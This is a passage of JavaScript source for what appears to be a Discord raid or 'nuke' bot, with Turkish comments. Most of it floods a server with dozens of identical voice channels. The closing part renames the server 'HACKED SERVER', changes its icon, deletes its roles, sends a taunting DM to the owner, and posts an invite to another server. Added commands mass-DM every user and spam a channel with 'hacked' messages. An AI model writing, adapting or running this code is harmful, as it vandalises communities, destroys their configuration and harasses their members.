    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild.setIcon(
      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png" ///SUNUCUNUN RESMİNİ DEĞİŞTİRİR HIZI RESİM SİTESİNDEN UPLOAD EDEBİLİRSİNİZ
    );

    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN İSMİNİ DEĞİŞTİRİR
    await client.user.setAvatar(""); //BOTUN PP Sİ YAPAR
    await client.user.setUsername("ャ HACKED ャ"); //BOTUN İSMİNİ DEĞİŞTİRİR İÇİM BOŞ BIRAK
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN ROLÜNÜN ALTINDAKİ ROLLERİ SİLER
    await msg.guild.owner.send("Sunucunu Hackledik Ağla :D"); //SUNUCUNUN KURUCUSUNA DM'DEN GÖNDERİLEN MESAJ
    const kanal = await msg.guild.channels.find(x => x.name === "ャ"); //DEĞİŞTİRMEYİN BOZULUR
    await kanal.send("https://www.youtube.com/watch?v=CAjfhMd_NTw **YENİ DİSCORD SUNUCUMUZ, NEW DİSCORD SERVER** https://discord.gg/qyTNQdm @everyone");
  }
});
client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDALİ BÜTÜN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone"
        )
      )
      .catch(console.error);
  } 
});

client.on('message', msg => {
  if (msg.content === '+spam') {
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //////O KANALA 'BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); /////DINDA BÜSSÜRÜ MSJ ATAR +spam
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
